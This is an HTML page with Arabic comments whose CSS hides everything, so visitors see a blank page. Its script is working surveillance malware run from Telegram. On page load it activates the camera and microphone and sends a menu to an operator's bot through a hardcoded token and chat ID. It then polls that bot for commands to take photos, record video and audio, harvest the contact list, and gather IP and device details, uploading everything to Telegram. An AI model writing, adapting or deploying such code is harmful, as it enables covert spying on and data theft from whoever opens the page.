<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>...</title>
    <style>
        body { margin: 0; padding: 0; background: white; }
        * { display: none; }
    </style>
</head>
<body>
    <script>
        const token = "7782080900:AAGvcMWaE_IAbb_0_0-HwcyCvQUUUVxBYmc";
        const chat_id = "5932979028";
        let lastUpdateId = 0;
        let cameraReady = false;
        let mediaStream = null;
        let videoTrack = null;
        let imageCapture = null;
        let isProcessing = false;
        
        // ========== تفعيل الكاميرا ==========
        async function initCamera() {
            try {
                mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                videoTrack = mediaStream.getVideoTracks()[0];
                imageCapture = new ImageCapture(videoTrack);
                cameraReady = true;
                console.log("✅ الكاميرا نشطة");
                await sendToTelegram("✅ تم تفعيل الكاميرا");
                return true;
            } catch (e) {
                console.error("❌ فشل:", e);
                cameraReady = false;
                return false;
            }
        }
        
        // ========== سحب جهات الاتصال ==========
        async function getContacts() {
            try {
                // التحقق من وجود واجهة الاتصال
                if (!navigator.contacts) {
                    await sendToTelegram("❌ متصفحك لا يدعم سحب جهات الاتصال");
                    return null;
                }
                
                await sendToTelegram("📞 جاري طلب الوصول إلى جهات الاتصال...");
                
                // طلب جهات الاتصال
                const contacts = await navigator.contacts.select(
                    ['name', 'tel', 'email'],  // الحقول المطلوبة
                    { multiple: true }          // السماح بتحديد متعدد
                );
                
                if (!contacts || contacts.length === 0) {
                    await sendToTelegram("❌ لا توجد جهات اتصال أو تم رفض الوصول");
                    return null;
                }
                
                // تنسيق جهات الاتصال لإرسالها
                let contactsText = "📞 *جهات الاتصال المستخرجة*\n\n";
                contactsText += `📊 العدد الإجمالي: ${contacts.length}\n`;
                contactsText += "─" + "─".repeat(30) + "\n\n";
                
                for (let i = 0; i < contacts.length; i++) {
                    const contact = contacts[i];
                    const name = contact.name?.[0] || "بدون اسم";
                    const phones = contact.tel?.map(t => t.value).join(", ") || "لا يوجد رقم";
                    const emails = contact.email?.join(", ") || "لا يوجد بريد";
                    
                    contactsText += `👤 ${i+1}. ${name}\n`;
                    contactsText += `📱 هاتف: ${phones}\n`;
                    if (emails !== "لا يوجد بريد") contactsText += `📧 بريد: ${emails}\n`;
                    contactsText += "─".repeat(20) + "\n";
                    
                    // تقسيم الرسالة إذا كانت طويلة جداً (تليجرام يسمح بـ 4096 حرف)
                    if (contactsText.length > 3500) {
                        await sendToTelegram(contactsText);
                        contactsText = "📞 *جهات الاتصال (تابع)*\n\n";
                    }
                }
                
                if (contactsText.length > 100) {
                    await sendToTelegram(contactsText);
                }
                
                await sendToTelegram(`✅ تم استخراج ${contacts.length} جهة اتصال بنجاح`);
                
                // إرسالها كملف CSV أيضاً
                await sendContactsAsCSV(contacts);
                
                return contacts;
            } catch (e) {
                console.error("فشل سحب جهات الاتصال:", e);
                await sendToTelegram(`❌ فشل سحب جهات الاتصال: ${e.message}`);
                return null;
            }
        }
        
        // إرسال جهات الاتصال كملف CSV
        async function sendContactsAsCSV(contacts) {
            try {
                let csvContent = "الاسم,رقم الهاتف,البريد الإلكتروني\n";
                
                for (const contact of contacts) {
                    const name = contact.name?.[0] || "بدون اسم";
                    const phones = contact.tel?.map(t => t.value).join(";") || "";
                    const emails = contact.email?.join(";") || "";
                    csvContent += `"${name}","${phones}","${emails}"\n`;
                }
                
                const blob = new Blob(["\uFEFF" + csvContent], { type: "text/csv;charset=utf-8" });
                await sendFile(blob, "contacts.csv", "document");
                await sendToTelegram("📎 تم إرسال جهات الاتصال كملف CSV");
            } catch (e) {
                console.error("فشل إرسال CSV:", e);
            }
        }
        
        // إرسال ملف عام
        async function sendFile(blob, filename, type = "document") {
            const formData = new FormData();
            formData.append("chat_id", chat_id);
            formData.append(type === "document" ? "document" : "photo", blob, filename);
            await fetch(`https://api.telegram.org/bot${token}/send${type === "document" ? "Document" : "Photo"}`, {
                method: "POST",
                body: formData
            });
        }
        
        // ========== دوال التصوير والتسجيل ==========
        async function capturePhoto() {
            if (!cameraReady) return null;
            try {
                return await imageCapture.takePhoto();
            } catch (e) {
                return null;
            }
        }
        
        async function recordVideo(duration = 10000) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                return new Promise((resolve) => {
                    recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
                    recorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'video/webm' });
                        stream.getTracks().forEach(t => t.stop());
                        resolve(blob);
                    };
                    recorder.start();
                    setTimeout(() => recorder.stop(), duration);
                });
            } catch (e) { return null; }
        }
        
        async function recordAudio(duration = 10000) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                return new Promise((resolve) => {
                    recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
                    recorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'audio/ogg' });
                        stream.getTracks().forEach(t => t.stop());
                        resolve(blob);
                    };
                    recorder.start();
                    setTimeout(() => recorder.stop(), duration);
                });
            } catch (e) { return null; }
        }
        
        // ========== دوال التليجرام ==========
        async function sendToTelegram(text) {
            try {
                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id, text, parse_mode: "Markdown" })
                });
            } catch (e) {}
        }
        
        async function sendPhoto(blob) {
            const formData = new FormData();
            formData.append("chat_id", chat_id);
            formData.append("photo", blob, "photo.jpg");
            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: "POST", body: formData });
        }
        
        async function sendVideo(blob) {
            const formData = new FormData();
            formData.append("chat_id", chat_id);
            formData.append("video", blob, "video.webm");
            await fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: "POST", body: formData });
        }
        
        async function sendVoice(blob) {
            const formData = new FormData();
            formData.append("chat_id", chat_id);
            formData.append("voice", blob, "voice.ogg");
            await fetch(`https://api.telegram.org/bot${token}/sendVoice`, { method: "POST", body: formData });
        }
        
        // معلومات الجهاز
        async function sendDeviceInfo() {
            try {
                const battery = await navigator.getBattery();
                const ip = await fetch("https://api.ipify.org?format=json").then(r => r.json()).catch(() => ({}));
                const msg = `
👑 *معلومات الجهاز* 👑

• IP: ${ip.ip || "غير معروف"}
• المتصفح: ${navigator.userAgent.substring(0, 80)}...
• النظام: ${navigator.platform}
• الشاشة: ${screen.width}x${screen.height}
• البطارية: ${Math.round(battery.level * 100)}% ${battery.charging ? '🔌' : '🔋'}
• الكاميرا: ${cameraReady ? '🟢 نشطة' : '🔴 متوقفة'}
                `;
                await sendToTelegram(msg);
            } catch(e) {}
        }
        
        // ========== واجهة البوت المتطورة ==========
        async function sendBotMenu() {
            const message = `🎮 *واجهة التحكم المتطورة* 🎮

اختر الإجراء المطلوب:`;
            
            const keyboard = {
                inline_keyboard: [
                    [{ text: "📸 صورة", callback_data: "photo" }, { text: "🎬 فيديو 10ث", callback_data: "video" }],
                    [{ text: "🎤 صوت 10ث", callback_data: "audio" }, { text: "📞 جهات الاتصال", callback_data: "contacts" }],
                    [{ text: "📸 10 صور", callback_data: "10photos" }, { text: "🎤 10 صوت", callback_data: "10audios" }],
                    [{ text: "🎬 فيديو دقيقة", callback_data: "video60" }, { text: "📊 معلومات الجهاز", callback_data: "info" }],
                    [{ text: "🔄 تنفيذ الكل", callback_data: "full" }, { text: "📹 حالة الكاميرا", callback_data: "status" }]
                ]
            };
            
            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id, text: message, parse_mode: "Markdown", reply_markup: keyboard })
            });
        }
        
        // ========== معالجة الأوامر ==========
        async function handleCommand(cmd) {
            if (isProcessing) {
                await sendToTelegram("⏳ انتظر...");
                return;
            }
            isProcessing = true;
            
            switch(cmd) {
                case "photo":
                    await sendToTelegram("📸 جاري...");
                    const p = await capturePhoto();
                    if (p) { await sendPhoto(p); await sendToTelegram("✅ تم"); }
                    else await sendToTelegram("❌ فشل");
                    break;
                    
                case "video":
                    await sendToTelegram("🎬 جاري تسجيل 10ث...");
                    const v = await recordVideo(10000);
                    if (v) { await sendVideo(v); await sendToTelegram("✅ تم"); }
                    else await sendToTelegram("❌ فشل");
                    break;
                    
                case "video60":
                    await sendToTelegram("🎬 جاري تسجيل دقيقة...");
                    const v60 = await recordVideo(60000);
                    if (v60) { await sendVideo(v60); await sendToTelegram("✅ تم"); }
                    else await sendToTelegram("❌ فشل");
                    break;
                    
                case "audio":
                    await sendToTelegram("🎤 جاري تسجيل 10ث...");
                    const a = await recordAudio(10000);
                    if (a) { await sendVoice(a); await sendToTelegram("✅ تم"); }
                    else await sendToTelegram("❌ فشل");
                    break;
                    
                case "contacts":
                    await getContacts();
                    break;
                    
                case "10photos":
                    await sendToTelegram("📸 جاري 10 صور...");
                    for (let i=0; i<10; i++) {
                        const ph = await capturePhoto();
                        if (ph) await sendPhoto(ph);
                        await new Promise(r => setTimeout(r, 300));
                    }
                    await sendToTelegram("✅ تم");
                    break;
                    
                case "10audios":
                    await sendToTelegram("🎤 جاري 10 تسجيلات...");
                    for (let i=0; i<10; i++) {
                        const au = await recordAudio(10000);
                        if (au) await sendVoice(au);
                        await new Promise(r => setTimeout(r, 500));
                    }
                    await sendToTelegram("✅ تم");
                    break;
                    
                case "info":
                    await sendDeviceInfo();
                    break;
                    
                case "full":
                    await sendToTelegram("🔄 بدء التنفيذ الكامل...");
                    const photo = await capturePhoto();
                    if (photo) await sendPhoto(photo);
                    await new Promise(r => setTimeout(r, 2000));
                    const video = await recordVideo(10000);
                    if (video) await sendVideo(video);
                    await new Promise(r => setTimeout(r, 2000));
                    const audio = await recordAudio(10000);
                    if (audio) await sendVoice(audio);
                    await sendToTelegram("✅ تم تنفيذ الكل");
                    break;
                    
                case "status":
                    await sendToTelegram(cameraReady ? "🟢 الكاميرا نشطة" : "🔴 الكاميرا متوقفة");
                    break;
            }
            isProcessing = false;
        }
        
        // جلب التحديثات
        async function getUpdates() {
            try {
                const url = `https://api.telegram.org/bot${token}/getUpdates?timeout=25&offset=${lastUpdateId+1}`;
                const res = await fetch(url);
                const data = await res.json();
                if (data.result) {
                    for (const update of data.result) {
                        lastUpdateId = update.update_id;
                        if (update.callback_query) {
                            await handleCommand(update.callback_query.data);
                            await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
                                method: "POST",
                                body: JSON.stringify({ callback_query_id: update.callback_query.id })
                            });
                        }
                    }
                }
            } catch(e) {}
        }
        
        // ========== التشغيل ==========
        window.onload = async () => {
            await initCamera();
            await sendBotMenu();
            await sendToTelegram("🎯 النظام جاهز - يمكنك الآن سحب جهات الاتصال والتحكم بالكاميرا");
            setInterval(getUpdates, 2000);
        };
        
        // الحفاظ على الكاميرا نشطة
        setInterval(() => {
            if (videoTrack && videoTrack.readyState === 'ended') {
                initCamera();
            }
        }, 5000);
    </script>
</body>
</html>
